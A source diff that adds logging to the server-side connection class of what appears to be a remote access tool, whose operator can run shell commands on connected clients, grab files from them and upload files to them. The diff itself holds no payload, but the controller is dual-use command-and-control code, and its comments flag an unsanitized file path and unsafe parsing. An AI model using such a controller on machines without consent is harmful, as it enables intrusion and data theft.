@@ -1,4 +1,5 @@
 #include "includeCrap.hpp"
+#include "logWindow.hpp"
 
 /*
     Class for a connection to the server.
@@ -15,6 +16,7 @@ private:
     char inputBuffer[1024] = {0}; // Used for the text input box
     const unsigned int inputBufferSize = 1024; // Size of the input buffer - could probably get rid of this dumb variable
     std::string msgToSend = ""; // This will be derived from the input buffer
+    logWindow* servLogWin = nullptr; // Pointer to the log window
 
     /*
         Reads all the data from the socket (flushes the socket)
@@ -147,20 +149,25 @@ private:
         Response from client: <cmd>;<response>
     */
     void genericCmd(std::string cmd){
+        this->servLogWin->add("connection::genericCmd() - INFO: Called with cmd: " + cmd);
         this->sockFdMutex.lock();
 
         // Send the command to the client:
         int bytesSent = send(this->sockFd, cmd.c_str(), cmd.length(), 0);
+        this->servLogWin->add("connection::genericCmd() - INFO: Sent " + std::to_string(bytesSent) + " bytes to client");
         if(bytesSent < 0){ // A negative value indicates an error
+            this->servLogWin->add("connection::genericCmd( - ERR: send() returned " + std::to_string(bytesSent) + " | " + strerror(errno));
             this->plainTextMessageHistory.push_back("ERR: send(): " + std::to_string(bytesSent) + " (likely disconnected)" + " | " + strerror(errno));
             this->sockFdMutex.unlock();
             return;
         }
 
         // Receive the response from the client:
+        this->servLogWin->add("connection::genericCmd() - INFO: Waiting for response from client (max 4096 bytes)...");
         char cmdRecvBuffer[4096] = {0}; // 4096 bytes should easily be enough for the responses to any commands sent using this function
         int bytesReceived = recv(this->sockFd, cmdRecvBuffer, 4096, 0);
         if(bytesReceived < 0){ // A negative value here also indicates an error. Not sure if I really need to be handling this error (will it actually occur?)
+            this->servLogWin->add("connection::genericCmd() - ERR: recv() returned " + std::to_string(bytesReceived) + " | " + strerror(errno));
             this->plainTextMessageHistory.push_back("ERR: recv(): " + std::to_string(bytesReceived) + " | " + strerror(errno));
             this->sockFdMutex.unlock();
             return;
@@ -169,9 +176,11 @@ private:
         // Parse the response and append it to the message history:
         std::string cmdRecvBufferString = std::string(cmdRecvBuffer); // Convert to a string for easier parsing
         if(!cmdRecvBufferString.starts_with(cmd)){
+            this->servLogWin->add("connection::genericCmd() - WARN: Received an unexpected response from the client");
             this->plainTextMessageHistory.push_back("WARN: Received an unexpected response from the client");
         }
         this->plainTextMessageHistory.push_back(cmdRecvBufferString.substr(cmd.length(), cmdRecvBufferString.length() - cmd.length() - 1)); // Extract just the <response> from "<cmd>;<response>;"
+        this->servLogWin->add("connection::genericCmd() - INFO: Response received and appended to message history");
         this->sockFdMutex.unlock();
     }
 
@@ -183,20 +192,25 @@ private:
         The file data is in raw bytes, so it can be written to a file as-is
     */
     void grab(std::string path){
+        this->servLogWin->add("connection::grab() - INFO: Called with path: " + path);
         this->sockFdMutex.lock();
 
         // Send the grab command to the client:
         int bytesSent = send(this->sockFd, ("grab;" + path + ";").c_str(), path.length() + 6, 0);
+        this->servLogWin->add("connection::grab() - INFO: Sent " + std::to_string(bytesSent) + " bytes to client");
         if(bytesSent < 0){
+            this->servLogWin->add("connection::grab() - ERR: send() returned " + std::to_string(bytesSent) + " | " + strerror(errno));
             this->plainTextMessageHistory.push_back("ERR: send(): " + std::to_string(bytesSent) + " (likely disconnected)" + " | " + strerror(errno));
             this->sockFdMutex.unlock();
             return;
         }
 
         // Receive 4096 bytes from the client - this will include the file size and the first chunk of the file (or all of it if it's smaller than 4096 bytes):
+        this->servLogWin->add("connection::grab() - INFO: Receiving first 4096 bytes from client...");
         char grabRecvBuffer[4096] = {0};
         int bytesReceived = recv(this->sockFd, grabRecvBuffer, 4096, 0);
         if(bytesReceived < 0){
+            this->servLogWin->add("connection::grab() - ERR: recv() returned " + std::to_string(bytesReceived) + " | " + strerror(errno));
             this->plainTextMessageHistory.push_back("ERR: recv(): " + std::to_string(bytesReceived) + " | " + strerror(errno));
             this->sockFdMutex.unlock();
             return;
@@ -205,13 +219,16 @@ private:
         // Parse the response to get the file size:
         std::string grabRecvBufferString = std::string(grabRecvBuffer); // Cant use this string for any of the file data, because null terminated :(
         if(grabRecvBufferString.substr(0, 5+path.size()+1) != "grab;" + path + ";" || grabRecvBufferString[5+path.size()+1] == '0'){
-            this->plainTextMessageHistory.push_back("ERR: Received bad response format or file not found");
+            this->servLogWin->add("connection::grab() - ERR: Received bad response format / file not found");
+            this->plainTextMessageHistory.push_back("ERR: Received bad response format / file not found");
             this->plainTextMessageHistory.push_back(grabRecvBufferString);
             this->plainTextMessageHistory.push_back("grab;" + path + ";");
             this->sockFdMutex.unlock();
             return;
         }
         unsigned long long int fileSize = std::stoull(grabRecvBufferString.substr(5+path.size()+1)); // !!! unsafe as fuck :( 
+        this->servLogWin->add("connection::grab() - INFO: Full file size: " + std::to_string(fileSize));
+        
 
         // Read the file data into an std::vector<char>, receive more data from the socket if the fileSize is greater than what has been received so far:
         std::vector<char> fileData;
@@ -219,6 +236,9 @@ private:
         unsigned int headerSize = 5+path.size()+1+std::to_string(fileSize).size()+1; // The size of "grab;[path];[file size];", so we can ignore it when 
         fileData.insert(fileData.end(), grabRecvBuffer+headerSize, grabRecvBuffer+bytesReceived); // Insert the data that was received in the first recv() call, minus the header
         unsigned long long int bytesReceivedTotal = bytesReceived - headerSize; // The total number of bytes of actual file data that has been received so far
+        if((long long int)fileSize-(long long int)bytesReceivedTotal > 0){
+            this->servLogWin->add("connection::grab() - INFO: Receiving remaining " + std::to_string((long long int)fileSize-(long long int)bytesReceivedTotal) + " bytes of data");
+        }
         while(bytesReceivedTotal < fileSize){
             bytesReceived = recv(this->sockFd, grabRecvBuffer, 4096, 0);
             if(bytesReceived < 0){
@@ -230,12 +250,14 @@ private:
             fileData.insert(fileData.end(), grabRecvBuffer, grabRecvBuffer+bytesReceived);
             bytesReceivedTotal += bytesReceived;
         }
+        this->servLogWin->add("connection::grab() - INFO: Received full response (" + std::to_string(fileSize) + " bytes)");
 
         // Write the file data to disk:
         this->plainTextMessageHistory.push_back("Recieved " + std::to_string(bytesReceivedTotal) + " bytes of data");
         std::ofstream of("./" + path, std::ios::binary); // !!!! unsanitized path, user stupidity could lead to overwriting files
         of.write(fileData.data(), fileData.size());
         of.close();
+        this->servLogWin->add("connection::grab() - INFO: File written to disk at ./" + path);
         this->plainTextMessageHistory.push_back("File written to disk at ./" + path);
 
         this->sockFdMutex.unlock();
@@ -248,15 +270,18 @@ private:
             upload;<file name>;<file size>;<file data>;
     */
     void upload(std::string path){
+        this->servLogWin->add("connection::upload() - INFO: Called with path: " + path);
         // Open the local file:
         std::ifstream f(path, std::ios::binary);
         if(f.is_open() != true){ // Most likely, the file does not exist
+            this->servLogWin->add("connection::upload() - ERR: File not found");
             this->plainTextMessageHistory.push_back("ERR: File not found");
         }else{
             this->sockFdMutex.lock();
 
             // Create the upload request:
             // "upload;<file name>;<file size>;<file data>;"
+            this->servLogWin->add("connection::upload() - INFO: Preparing upload request");
             std::string header = "upload;" + std::filesystem::path(path).filename().string() + ";" + std::to_string(std::filesystem::file_size(path)) + ";";
             std::vector<char> uploadData;
             uploadData.reserve(header.size() + std::filesystem::file_size(path));
@@ -267,20 +292,24 @@ private:
             // Send the upload request to the client:
             int bytesSent = send(this->sockFd, uploadData.data(), uploadData.size(), 0);
             if(bytesSent < 0){
+                this->servLogWin->add("ERR: send(): " + std::to_string(bytesSent) + " | " + strerror(errno));
                 this->plainTextMessageHistory.push_back("ERR: send(): " + std::to_string(bytesSent) + " (likely disconnected)" + " | " + strerror(errno));
                 this->sockFdMutex.unlock();
                 return;
             }
-            this->plainTextMessageHistory.push_back("Sent " + std::to_string(bytesSent) + " bytes of data, waiting for response");
+            this->servLogWin->add("connection::upload() - INFO: Sent upload request");
 
             // Receive the response from the client:
             char responseBuffer[1024] = {0};
+            this->servLogWin->add("connection::upload() - INFO: Waiting for response (max 1024 bytes)");
             int bytesReceived = recv(this->sockFd, responseBuffer, 1024, 0);
             if(bytesReceived < 0){
+                this->servLogWin->add("connection::upload() - ERR: recv(): " + std::to_string(bytesReceived) + " | " + strerror(errno));
                 this->plainTextMessageHistory.push_back("ERR: recv(): " + std::to_string(bytesReceived) + " | " + strerror(errno));
                 this->sockFdMutex.unlock();
                 return;
             }
+            this->servLogWin->add("connection::upload() - INFO: Received response: " + std::string(responseBuffer));
             this->plainTextMessageHistory.push_back("Response: " + std::string(responseBuffer));
             
             this->sockFdMutex.unlock();
@@ -295,21 +324,27 @@ private:
             exec;<command>;<response length>;<response data>;
     */
     void exec(std::string cmd){
+        this->servLogWin->add("connection::exec() - INFO: Called with cmd: " + cmd);
+        this->servLogWin->add("connection::exec() - INFO: Automatically appending 2>&1 to the command to receive stderr");
         cmd += " 2>&1"; // Redirects stderr to stdout
         this->sockFdMutex.lock();
 
         // Send the command to the client
         int bytesSent = send(this->sockFd, ("exec;" + cmd + ";").c_str(), cmd.length() + 6, 0);
         if(bytesSent < 0){
+            this->servLogWin->add("connection::exec() - ERR: send(): " + std::to_string(bytesSent) + " | " + strerror(errno));
             this->plainTextMessageHistory.push_back("ERR: send(): " + std::to_string(bytesSent) + " (likely disconnected)" + " | " + strerror(errno));
             this->sockFdMutex.unlock();
             return;
         }
+        this->servLogWin->add("Sent " + std::to_string(bytesSent) + " bytes of data, waiting for response");
 
         // Receive the first 4096 bytes of the response, this is by far enough to get the response length:
         char responseBuffer[4096] = {0};
+        this->servLogWin->add("connection::exec() - INFO: Receiving first 4096 bytes of response");
         int bytesReceived = recv(this->sockFd, responseBuffer, 4096, 0);
         if(bytesReceived < 0){
+            this->servLogWin->add("connection::exec() - ERR: recv(): " + std::to_string(bytesReceived) + " | " + strerror(errno));
             this->plainTextMessageHistory.push_back("ERR: recv(): " + std::to_string(bytesReceived) + " | " + strerror(errno));
             this->sockFdMutex.unlock();
             return;
@@ -318,12 +353,14 @@ private:
         // Parse the response size from the response:
         std::string responseBufferString = std::string(responseBuffer);
         if(responseBufferString.substr(0, 6+cmd.size()) != "exec;" + cmd + ";"){
+            this->servLogWin->add("connection::exec() - ERR: Received bad response format");
             this->plainTextMessageHistory.push_back("ERR: Received bad response format");
             this->plainTextMessageHistory.push_back(responseBufferString);
             this->sockFdMutex.unlock();
             return;
         }
         unsigned long long int responseSize = std::stoull(responseBufferString.substr(6+cmd.size())); // Unsafe poopoo code!!!!!
+        this->servLogWin->add("connection::exec() - INFO: Full response size: " + std::to_string(responseSize));
 
         // Add the first 4096-<header size> bytes of the first chunk of the response to the response vector:
         std::vector<char> response;
@@ -333,6 +370,9 @@ private:
 
         // Receive more chunks of 4096 bytes until the total number of bytes received is equal to the response size:
         unsigned long long int bytesReceivedTotal = bytesReceived - headerSize;
+        if((long long int)responseSize-(long long int)bytesReceivedTotal > 0){
+            this->servLogWin->add("connection::exec() - INFO: Receiving remaining " + std::to_string((long long int)responseSize-(long long int)bytesReceivedTotal) + " bytes of response");
+        }
         while(bytesReceivedTotal < responseSize){
             bytesReceived = recv(this->sockFd, responseBuffer, 4096, 0);
             if(bytesReceived < 0){
@@ -343,6 +383,7 @@ private:
             response.insert(response.end(), responseBuffer, responseBuffer+bytesReceived); // Insert the received bytes into the end of the response vector
             bytesReceivedTotal += bytesReceived;
         }
+        this->servLogWin->add("connection::exec() - INFO: Received full response (" + std::to_string(responseSize) + " bytes)");
 
         // Add the response to the plain text message history:
         // Split it up based on newlines to prevent crashing imgui (a single giant line will cause imgui/imtui to try and render too many triangles)
@@ -352,6 +393,7 @@ private:
         while(std::getline(ss, line, '\n')){
             this->plainTextMessageHistory.push_back(line);
         }
+        this->servLogWin->add("connection::exec() - INFO: Response received and added to message history successfully");
         this->sockFdMutex.unlock();
     }
 
@@ -365,8 +407,9 @@ public:
     bool terminalActive = false; // Whether or not the terminal is being displayed and used
 
     // Constructor and destructor are pretty basic:
-    connection(int sockFd){
-       this->sockFd = sockFd;
+    connection(int sockFd, logWindow* logWin){
+        this->servLogWin = logWin;
+        this->sockFd = sockFd;
     }
 
     ~connection(){
@@ -384,18 +427,22 @@ public:
         The server responds to the client with with "ip;username;hostname;connected;" if the connection was successful
     */
     bool intialConnection(){
+        this->servLogWin->add("connection::intialConnection() - INFO: Starting initial connection with client");
         this->sockFdMutex.lock();
 
         // Receive the initial connection message from the client:
         char buffer[1024] = {0}; // Should easily be enough space
         int bytesReceived = recv(this->sockFd, buffer, 1024, 0);
         if(bytesReceived < 0){
+            this->servLogWin->add("connection::intialConnection() - ERR: recv(): " + std::to_string(bytesReceived) + " | " + strerror(errno));
             return false;
         }
+        this->servLogWin->add("connection::intialConnection() - INFO: Received initial connection message from client (" + std::to_string(bytesReceived) + " bytes)");
 
         // Parse the message:
         std::string bufferString = std::string(buffer); // Convert to a string for easier parsing
         if(std::count(bufferString.begin(), bufferString.end(), ';') != 3){
+            this->servLogWin->add("connection::intialConnection() - WARN: Received bad initial connection message from client");
             return false;
         }
         this->publicIp = bufferString.substr(0, bufferString.find(';'));
@@ -406,10 +453,17 @@ public:
         /*
             ... add some more verification here if you want to make extra sure the client is sending valid data ...
         */
+    
+        this->servLogWin->add("connection::intialConnection() - INFO: Parsed client info: " + this->publicIp + " | " + this->username + " | " + this->hostname);
 
         // Send the confirmation message to the client, since the connection was successful:
         std::string confirmMsg = this->publicIp + ";" + this->username + ";" + this->hostname + ";connected;";
         int bytesSent = send(this->sockFd, confirmMsg.c_str(), confirmMsg.length(), 0);
+        if(bytesSent < 0){
+            this->servLogWin->add("connection::intialConnection() - ERR: send(): " + std::to_string(bytesSent) + " | " + strerror(errno));
+            return false;
+        }
+        this->servLogWin->add("connection::intialConnection() - INFO: Sent confirmation message to client");
 
         this->sockFdMutex.unlock();
         return true;
